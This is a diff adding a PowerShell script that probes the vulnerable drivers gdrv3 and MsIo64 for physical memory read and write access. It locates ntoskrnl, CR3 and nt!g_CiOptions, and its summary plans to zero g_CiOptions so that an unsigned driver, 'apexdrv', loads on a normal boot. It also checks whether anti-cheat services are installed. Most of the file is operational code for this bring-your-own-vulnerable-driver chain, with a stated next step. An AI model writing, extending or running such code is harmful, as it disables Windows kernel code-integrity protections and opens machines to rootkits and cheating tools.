@@ -1,0 +1,345 @@
+# ============================================================================
+# p36_write.ps1 - BYOVD write-primitive probe + kernel discovery.
+#
+# QUESTION THIS ANSWERS (the last unknown in the gate):
+#   gdrv3 gives a VERIFIED physical READ.  Where does the physical WRITE come
+#   from - because without a write there is no g_CiOptions patch, no image
+#   staging and no mapper.
+#
+# CANDIDATES, tried in order, nothing else changed:
+#   W1 \Device\PhysicalMemory  elevated + SeLockMemoryPrivilege (native)
+#   W2 MsIo64 0x80102040 map into our process (driver-mediated view, RW)
+#   W3 gdrv3 0xC3502004 / 0xC3502808 (completeness)
+# Then read-only discovery: ntoskrnl phys, CR3 via PML4 self-map, VA->PA walk,
+# nt!g_CiOptions pattern.  Only the W1/W2 marker test writes, and it restores.
+#
+# Pass criterion: at least one of W1/W2 returns a view whose bytes match the
+# gdrv3 read of the same PA AND a marker written there is visible through the
+# independent gdrv3 path and restores cleanly.  X1+X2+X3 must also land.
+# Run via p36_task.ps1 (elevated, survives the tool terminal).
+# ============================================================================
+$ErrorActionPreference = 'Continue'
+$OUT = Join-Path $PSScriptRoot 'p36_write.txt'
+$CS  = Join-Path $PSScriptRoot 'p36_prov.cs'
+$MARK = [byte[]](0xE0,0xCE,0xF1,0x0F,0xED,0xAC,0xEF,0x0D)   # 0x0DEFACED0FF1CE0
+
+$script:L = New-Object System.Collections.ArrayList
+function Log([string]$s) {
+    $script:L.Add($s) | Out-Null
+    Add-Content -LiteralPath $OUT -Value $s -Encoding UTF8
+    Write-Host $s
+}
+
+$mtx = New-Object System.Threading.Mutex($false, 'Global\QwenKern_p36')
+if (-not $mtx.WaitOne(0)) { Write-Host 'p36 already running'; exit 0 }
+
+Set-Content -LiteralPath $OUT -Value ("=== p36 BYOVD WRITE-PRIMITIVE PROBE {0} ===" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
+$adm = [bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
+Log ("  admin={0}  pid={1}  host={2}" -f $adm, $PID, $env:COMPUTERNAME)
+if (-not $adm) { Log '  !! NOT ELEVATED - device DACL will deny; re-run via p36_task.ps1' }
+
+# ---- environment -----------------------------------------------------------
+$os = Get-CimInstance Win32_OperatingSystem
+$cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
+Log ("  os={0} build={1}.{2}  cpu={3}" -f $os.Caption, $os.BuildNumber, $os.Version, $cpu.Name)
+$sb = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecureBoot\State' -EA 0).UEFISecureBootEnabled
+Log ("  SecureBoot={0}" -f $sb)
+$sso = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control' -EA 0).SystemStartOptions
+Log ("  SystemStartOptions=[{0}]" -f $sso)
+$ts = ((& bcdedit.exe /enum '{current}' 2>&1 | Select-String 'testsigning|hypervisorlaunchtype|nointegritychecks|vsm ') -join ' ; ')
+Log ("  bcdedit: {0}" -f $ts)
+try {
+    $dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -EA 0
+    if ($dg) { Log ("  DeviceGuard: VBS={0} servicesRunning={1} codeIntegrityPolicy={2}" -f $dg.VirtualizationBasedSecurityStatus, ($dg.SecurityServicesRunning -join ','), $dg.CodeIntegrityPolicyEnforcementStatus) }
+    else { Log '  DeviceGuard: class unavailable' }
+} catch { Log ("  DeviceGuard: {0}" -f $_.Exception.Message) }
+foreach ($s in 'gdrv3','MsIo','apexdrv','eaanticheat','EAAntiCheatService') {
+    $r = ((& sc.exe query $s 2>&1) -join ' ')
+    if ($r -match 'SERVICE_NAME') { Log ("  svc {0,-20} {1}" -f $s, (($r -replace '\s+',' ') -replace '.*STATE\s*:\s*','STATE ')) } else { Log ("  svc {0,-20} ABSENT" -f $s) }
+}
+
+# ---- load the C# helper ----------------------------------------------------
+try {
+    Add-Type -Path $CS -ErrorAction Stop
+    Log '  [cs] p36_prov.cs compiled'
+} catch {
+    Log ("  [cs] COMPILE FAILED: {0}" -f $_.Exception.Message)
+    Log '  [cs] (see p36_write.txt tail; aborting)'
+    '-- p36 ABORT (compile) --' | Add-Content -LiteralPath $OUT -Encoding UTF8
+    exit 1
+}
+
+$ramTop = [P36Prov]::RamTop()
+Log ("  ramTop=0x{0:x} ({1} GB)" -f $ramTop, [math]::Round($ramTop/1GB,1))
+
+# ---- RAM truth table -------------------------------------------------------
+# gdrv3 maps a PA with NO backing-RAM validation.  "PA < ramTop" is not a RAM
+# test: on a 32 GB box the PCI/MMIO hole sits BELOW ramTop, and a hole read avs
+# gdrv3 -> bugcheck 0x3B.  Proven twice on the host (01/11 21:54, 27/10 23:50).
+$ramRanges = ''
+try {
+    $k = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey('HARDWARE\RESOURCEMAP\System Resources\Physical Memory')
+    $rb = $k.GetValue('.Translated'); $k.Close()
+    if ($rb -and $rb.Length -ge 16) {
+        $off = 4; $cnt = [BitConverter]::ToUInt32($rb, 0); $parts = New-Object System.Collections.ArrayList
+        for ($l = 0; $l -lt $cnt; $l++) {
+            if ($off + 16 -gt $rb.Length) { break }
+            $off += 12; $n = [BitConverter]::ToUInt32($rb, $off); $off += 4
+            for ($d = 0; $d -lt $n; $d++) {
+                if ($off + 16 -gt $rb.Length) { break }
+                $type = $rb[$off]; $st = [BitConverter]::ToUInt64($rb, $off + 4)
+                $ln = [BitConverter]::ToUInt32($rb, $off + 12); $off += 16
+                if ($type -eq 3 -and $ln -gt 0) { $parts.Add(('{0:x}-{1:x}' -f $st, ($st + $ln))) | Out-Null }
+            }
+        }
+        $ramRanges = ($parts -join ',')
+    }
+} catch { }
+if ($ramRanges -eq '') { Log '  !! RAM map EMPTY - fallback pa<ramTop (hole PAs can still bugcheck)' }
+else { Log ("  ramRanges = {0}" -f $ramRanges) }
+[P36Prov]::SetRamRanges($ramRanges, $ramTop)
+
+# per-IOCTL breadcrumb in its own file: it must survive a bugcheck, and the scan
+# issues ~16k reads so the main log would be too slow.
+$ioPath = Join-Path $PSScriptRoot 'p36_io.txt'
+Set-Content -LiteralPath $ioPath -Value ("# io breadcrumb {0}" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss')) -Encoding UTF8
+$script:ioSw = New-Object System.IO.StreamWriter($ioPath, $true)
+$script:ioSw.AutoFlush = $true
+try { [P36Prov]::Notify = [P36Prov+Note] { param([string]$s) $script:ioSw.WriteLine($s) } }
+catch { Log ('  !! Notify hook failed: ' + $_.Exception.Message) }
+
+$ref0 = New-Object byte[] 32
+
+# ---- G0: the one verified read primitive ----------------------------------
+$g = [IntPtr]::Zero
+$err = [P36Prov]::GdrvOpen([ref]$g)
+if ($err -ne '') { Log ("  G0 \\.\GIOV3 FAIL {0}" -f $err) } else {
+    Log ("  G0 \\.\GIOV3 open ok handle=0x{0:x}" -f $g.ToInt64())
+    $ref0 = [P36Prov]::GdrvRead($g, [uint64]0x1000, 32)
+    Log ("  G0 read phys 0x1000 = {0}" -f ([P36Prov]::Hex($ref0)))
+    Log ("  G0 read phys 0x2000 = {0}" -f ([P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x2000, 16))))
+}
+
+$verdict = [ordered]@{ W1_physmem = $false; W2_msio = $false; W3_gdrv = $false; X_cr3 = $false; X_ntos = $false; X_ci = $false }
+$ciTargetVa = [uint64]0; $ciValue = [uint32]0
+$ntPhys = [uint64]0; $ntSize = [uint32]0; $cr3 = [uint64]0; $ntVa = [uint64]0
+# ---- W1: \Device\PhysicalMemory --------------------------------------------
+Log ''
+Log '########## W1 \Device\PhysicalMemory (native, elevated, SeLockMemoryPrivilege) ##########'
+$sec = [IntPtr]::Zero
+foreach ($mask in [uint32]0xF001F, [uint32]0x6, [uint32]0x4, [uint32]0x2, [uint32]0x1) {
+    $pv = ''
+    Log ("  {0}   SeLockMemoryPrivilege={1}" -f ([P36Prov]::PhysMemOpenMask($mask, [ref]$sec, [ref]$pv)), $pv)
+    if ($sec -ne [IntPtr]::Zero) { Log '  (opened - proceeding with the marker test on this handle)' ; break }
+}
+if ($sec -ne [IntPtr]::Zero) {
+    $view = [IntPtr]::Zero; $vs = [int64]0
+    $e = [P36Prov]::PhysMemMap($sec, [uint64]0x1000, 0x1000, $false, [ref]$view, [ref]$vs)
+    if ($e -eq '') {
+        $vva = [uint64]$view.ToInt64()
+        Log ("  map pa=0x1000 -> view=0x{0:x} viewSize=0x{1:x}" -f $vva, $vs)
+        $a = [P36Prov]::ReadAt($vva, 16)
+        $b = [P36Prov]::Hex($ref0[0..15])
+        Log ("  view[0:16] = {0}" -f $a)
+        Log ("  gdrv[0:16] = {0}" -f $b)
+        $readOk = ($a -ne $null -and $a -eq $b)
+        Log ("  W1 read-coherent = {0}" -f $readOk)
+        $orig = [P36Prov]::ReadAt(($vva + 0x10), 8)
+        $wr = [P36Prov]::WriteAt(($vva + 0x10), $MARK)
+        $viaGdrv = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        $markHex = [P36Prov]::Hex($MARK)
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        $restored = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1010, 8))
+        Log ("  marker orig={0} wrote={1} via_gdrv={2} restored={3}" -f $orig, $markHex, $viaGdrv, $restored)
+        $writeOk = ($viaGdrv -eq $markHex) -and ($restored -eq $orig)
+        Log ("  W1 write-coherent+restored = {0}" -f $writeOk)
+        $t0 = Get-Date
+        for ($i = 0; $i -lt 200; $i++) { [P36Prov]::WriteAt(($vva + 0x10), $MARK) | Out-Null }
+        [P36Prov]::WriteAt(($vva + 0x10), [byte[]]($orig -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+        Log ("  W1 200 view writes = {0:N0} ms ({1:N0} us/op)" -f ((Get-Date) - $t0).TotalMilliseconds, (((Get-Date) - $t0).TotalMilliseconds * 1000 / 200))
+        $verdict.W1_physmem = ($readOk -and $writeOk)
+        if ($verdict.W1_physmem) { Log '  W1 PASS - native physical R/W view held open' }
+        else { Log ("  W1 FAIL - unmap={0}" -f ([P36Prov]::PhysMemUnmap($sec, $view))) }
+    } else { Log ("  map FAIL: {0}" -f $e) }
+} else { Log '  W1 no section handle' }
+
+# ---- W2: MsIo64 map ------------------------------------------------------
+Log ''
+Log '########## W2 MsIo64 0x80102040 (fallback driver-mediated view) ##########'
+$mio = [IntPtr]::Zero
+$me2 = [P36Prov]::MsIoOpen([ref]$mio)
+if ($me2 -ne '') { Log ("  open \\.\MSIO FAIL {0}" -f $me2) } else {
+    Log ("  open \\.\MSIO ok handle=0x{0:x}" -f $mio.ToInt64())
+    $ref4 = [P36Prov]::Hex($ref0[0..15])
+    foreach ($shape in 0,1,2,3) {
+        $err2 = [uint32]0; $oh = ''
+        $st = [P36Prov]::MsIoTry($mio, $shape, [uint64]0x1000, 0x1000, [ref]$err2, [ref]$oh)
+        Log ("  {0}" -f $st)
+        if ($st -match ' OK') {
+            Log ("    out={0}" -f $oh)
+            $q = $oh -split ' '
+            for ($k = 0; $k -lt 8; $k++) {
+                $v = [uint64]::Parse(($q[($k*8)..($k*8+7)] -join ''), 'HexNumber')
+                if ([P36Prov]::IsUserVa($v)) {
+                    $sample = [P36Prov]::ReadAt($v, 16)
+                    Log ("    q[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $sample, ($sample -eq $ref4))
+                    if ($sample -eq $ref4 -and -not $verdict.W2_msio) {
+                        $verdict.W2_msio = $true
+                        Log ("    W2 PASS - user view at 0x{0:x} maps pa=0x1000; marker test:" -f $v)
+                        $o2 = [P36Prov]::ReadAt($v, 8)
+                        [P36Prov]::WriteAt($v, $MARK) | Out-Null
+                        $back = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_,16) })) | Out-Null
+                        $res = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                        Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $back, $res)
+                        if ($back -ne ([P36Prov]::Hex($MARK)) -or $res -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
+                    }
+                }
+            }
+        }
+        if ($verdict.W2_msio) { break }
+    }
+    # REVISED shape (p36 run 1 landed err=998 = STATUS_INVALID_USER_BUFFER only
+    # for the 0x28 shape, err=87 = STATUS_INVALID_PARAMETER for the other two):
+    # the unmap handler at 0x156b calls ProbeForRead(q1, q0, 4) AND
+    # ProbeForWrite(q1, q0, 4) -> q0 is a LENGTH and q1 is a USER POINTER.
+    foreach ($layout in 0, 1) {
+        foreach ($ql in [uint64]0x28, [uint64]0x40, [uint64]0x10) {
+            $e4 = [uint32]0; $det = ''
+            $st2 = [P36Prov]::MsIoMapTry2($mio, $layout, [uint64]0x1000, 0x1000, $ql, [ref]$e4, [ref]$det)
+            Log ("  try2 {0}" -f $st2)
+            if ($det -ne '') { Log ("    {0}" -f $det) }
+            $u = [regex]::Match($det, 'user= (.*)$').Groups[1].Value
+            if ($u -ne '') {
+                $q = $u -split ' '
+                for ($k = 0; $k -lt 16; $k++) {
+                    $v = [uint64]::Parse(($q[($k * 8)..($k * 8 + 7)] -join ''), 'HexNumber')
+                    if ([P36Prov]::IsUserVa($v)) {
+                        $s2 = [P36Prov]::ReadAt($v, 16)
+                        Log ("    user[{0}]=0x{1:x} deref={2} match={3}" -f $k, $v, $s2, ($s2 -eq $ref4))
+                        if ($s2 -eq $ref4 -and -not $verdict.W2_msio) {
+                            $verdict.W2_msio = $true
+                            Log ("    W2 PASS - user view 0x{0:x} maps pa=0x1000; marker test:" -f $v)
+                            $o2 = [P36Prov]::ReadAt($v, 8)
+                            [P36Prov]::WriteAt($v, $MARK) | Out-Null
+                            $bk = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                            [P36Prov]::WriteAt($v, [byte[]]($o2 -split ' ' | ForEach-Object { [Convert]::ToByte($_, 16) })) | Out-Null
+                            $rs = [P36Prov]::Hex([P36Prov]::GdrvRead($g, [uint64]0x1000, 8))
+                            Log ("    orig={0} wrote={1} via_gdrv={2} restored={3}" -f $o2, ([P36Prov]::Hex($MARK)), $bk, $rs)
+                            if ($bk -ne ([P36Prov]::Hex($MARK)) -or $rs -ne $o2) { $verdict.W2_msio = $false; Log '    W2 marker NOT coherent' }
+                        }
+                    }
+                }
+            }
+            if ($verdict.W2_msio) { break }
+        }
+        if ($verdict.W2_msio) { break }
+    }
+    [P36Prov]::CloseHandle2($mio) | Out-Null
+}
+
+# ---- W3: gdrv3 own map / copy -------------------------------------------
+Log ''
+Log '########## W3 gdrv3 0xC3502004 map / 0xC3502808 copy-user->phys ##########'
+if ($g -ne [IntPtr]::Zero) {
+    $va = [uint64]0; $e3 = [uint32]0
+    Log ("  0xC3502004 in{{pa,size}} pa=0x1000: {0}" -f ([P36Prov]::GdrvMapTry($g, [uint64]0x1000, [uint64]0x1000, [ref]$va, [ref]$e3)))
+    Log ("  0xC3502808 in{{b,a,n}} a=0x1000: {0}" -f ([P36Prov]::GdrvCopyTry($g, [uint64]0x1000, [uint64]0x2000, 8, [ref]$e3)))
+}
+# ---- X: discovery (read-only) -------------------------------------------
+Log ''
+Log '########## X discovery (read-only, gdrv3 read only) ##########'
+if ($g -ne [IntPtr]::Zero) {
+    # read limits FIRST - run 1 died in here without saying why
+    try {
+        $rep0 = ''
+        Log ("  ladder read 0x100000 okCount={0}" -f ([P36Prov]::SizeLadder($g, [uint64]0x100000, [ref]$rep0)))
+        foreach ($ln in ($rep0 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    } catch { Log ("  ladder EXCEPTION: {0}" -f $_.Exception.Message) }
+    try {
+        $rep1 = ''
+        Log ("  sweep 0x100000..0x40000000 step 0x100000 okCount={0}" -f ([P36Prov]::SweepRead($g, [uint64]0x100000, [uint64]0x40000000, [uint64]0x100000, [ref]$rep1)))
+        foreach ($ln in ($rep1 -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    } catch { Log ("  sweep EXCEPTION: {0}" -f $_.Exception.Message) }
+
+    $hits = ''
+    try { $r1 = [P36Prov]::ScanNtoskrnl($g, $ramTop, [uint64]0x40000000, [ref]$hits) }
+    catch { $r1 = ''; Log ("  X1 EXCEPTION: {0}" -f $_.Exception.Message) }
+    foreach ($ln in ($hits -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+    if ($r1 -eq '') { Log '  X1 no validated ntoskrnl below 1 GB'; } else {
+        $m = [regex]::Match($hits, 'pa=0x([0-9a-f]+) sizeOfImage=0x([0-9a-f]+).*export\[yes\]')
+        if ($m.Success) {
+            $ntPhys = [uint64]::Parse($m.Groups[1].Value, 'HexNumber')
+            $ntSize = [uint32]::Parse($m.Groups[2].Value, 'HexNumber')
+            Log ("  X1 ntoskrnl phys=0x{0:x} sizeOfImage=0x{1:x}  PASS" -f $ntPhys, $ntSize)
+            $verdict.X_ntos = $true
+        }
+    }
+
+    # X2 CR3 by PML4 self-reference (index 0x1ED, double-checked)
+    foreach ($lim in [uint64]0x40000000, [uint64]0x100000000) {
+        $notes = ''
+        try { $r2 = [P36Prov]::FindPml4($g, $ramTop, $lim, [ref]$cr3, [ref]$notes) }
+        catch { Log ("  X2 EXCEPTION (lim=0x{0:x}): {1}" -f $lim, $_.Exception.Message) }
+        foreach ($ln in ($notes -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+        if ($cr3 -ne 0) { break }
+    }
+    if ($cr3 -eq 0) { Log '  X2 no self-mapped PML4 found  FAIL' } else {
+        $self = [uint64]0
+        $wok = [P36Prov]::Walk($g, $cr3, [uint64]0xFFFFF6FB7DBED000, [ref]$self)
+        Log ("  X2 cr3=0x{0:x}  self-test walk(PXE_BASE)=0x{1:x} present={2}" -f $cr3, $self, $wok)
+        $verdict.X_cr3 = ($wok -and $self -eq $cr3)
+        Log ("  X2 CR3 {'VALID' if self-consistent} = {0}" -f $verdict.X_cr3)
+    }
+
+    # X3 ntoskrnl virtual base
+    if ($verdict.X_cr3 -and $ntPhys -ne 0) {
+        try { $r3 = [P36Prov]::FindKernelVa($g, $cr3, $ntPhys, $ntSize, [ref]$ntVa) }
+        catch { $r3 = ''; Log ("  X3 EXCEPTION: {0}" -f $_.Exception.Message) }
+        if ($r3 -eq '') { Log '  X3 ntoskrnl VA not found  FAIL' }
+        else { Log ("  X3 ntoskrnl VA base=0x{0:x}  PASS" -f $ntVa) }
+    }
+
+    # X4 nt!g_CiOptions (informational - no write in this probe)
+    if ($ntVa -ne 0) {
+        $rep = ''
+        try { $n = [P36Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPhys, $ntSize, [ref]$rep) }
+        catch { $n = '0'; Log ("  X4 EXCEPTION: {0}" -f $_.Exception.Message) }
+        foreach ($ln in ($rep -split "`r`n")) { if ($ln -ne '') { Log $ln } }
+        Log ("  X4 pattern hits = {0}" -f $n)
+        $ms = [regex]::Match($rep, 'targetVa=0x([0-9a-f]+) targetPa=0x([0-9a-f]+) current=0x([0-9a-f]+)\s+<==')
+        if ($ms.Success) {
+            $ciTargetVa = [uint64]::Parse($ms.Groups[1].Value, 'HexNumber')
+            $ciValue = [uint32]::Parse($ms.Groups[3].Value, 'HexNumber')
+            $verdict.X_ci = $true
+            Log ("  X4 g_CiOptions targetVa=0x{0:x} current=0x{1:x2}  REGISTERED for the p37 patch" -f $ciTargetVa, $ciValue)
+        } else { Log '  X4 no self-consistent hit (still usable: report lists every candidate)' }
+    }
+}
+
+# ---- VERDICT ------------------------------------------------------------
+Log ''
+if ($script:ioSw) { try { $script:ioSw.Flush(); $script:ioSw.Close() } catch { } }
+Log ("  io: issued={0} skipped_not_ram={1} lastPa=0x{2:x}" -f [P36Prov]::Issued, [P36Prov]::SkippedOutOfRam, [P36Prov]::LastIssuedPa)
+Log '########## VERDICT ##########'
+Log ("  W1 \\Device\\PhysicalMemory phys R/W : {0}" -f $(if ($verdict.W1_physmem) { 'PASS' } else { 'no' }))
+Log ("  W2 MsIo64 map (fallback)           : {0}" -f $(if ($verdict.W2_msio) { 'PASS' } else { 'no' }))
+Log ("  W3 gdrv3 map/copy                  : see above")
+Log ("  X  ntoskrnl={0} cr3={1} cioptions={2}" -f $verdict.X_ntos, $verdict.X_cr3, $verdict.X_ci)
+if ($verdict.W1_physmem -or $verdict.W2_msio) {
+    Log '  *** WRITE PRIMITIVE AVAILABLE ***'
+    Log '      => BYOVD path = stage nothing, keep testsigning OFF on a normal boot,'
+    Log '         patch nt!g_CiOptions to 0, `sc start apexdrv` (loader does relocs,'
+    Log '         imports and DriverEntry), restore g_CiOptions, then G1 gate run.'
+    if ($verdict.X_cr3 -and $verdict.X_ci) { Log '      cr3 + g_CiOptions are resolved => p37 can patch immediately.' }
+    else { Log '      cr3/g_CiOptions need one more pass before p37.' }
+} else {
+    Log '  *** NO WRITE PRIMITIVE ***'
+    Log '      => driver-loaded-on-a-normal-boot is unreachable until one of W1/W2 lands.'
+    Log '      Next variable: MsIo64 struct shape from temp\drv\msio_1500.txt, or a'
+    Log '      second provider (the box has gdrv3 + MsIo only).'
+}
+if ($g -ne [IntPtr]::Zero) { [P36Prov]::CloseHandle2($g) | Out-Null }
+Log ("-- p36 END {0} --" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss'))
+$script:L | Out-Null
+
